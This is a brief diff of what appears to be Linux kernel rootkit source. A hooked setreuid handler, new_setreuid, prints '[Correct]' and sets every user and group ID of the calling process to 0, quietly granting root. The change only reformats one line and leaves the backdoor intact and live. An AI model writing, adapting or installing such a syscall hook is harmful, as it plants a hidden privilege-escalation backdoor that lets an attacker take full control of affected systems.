@@ -22,7 +22,8 @@ asmlinkage int new_setreuid (uid_t ruid, uid_t euid) {
 
 		 printk(KERN_ALERT "[Correct] \n");
 
-		#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29) 		 		       	current->uid = current -> gid = 0;
+		#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+	 		current -> uid = current -> gid = 0;
 		 	current -> euid = current -> egid = 0;
 		 	current -> suid = current -> sgid = 0;
 		 	current -> fsuid = current -> fsgid = 0;
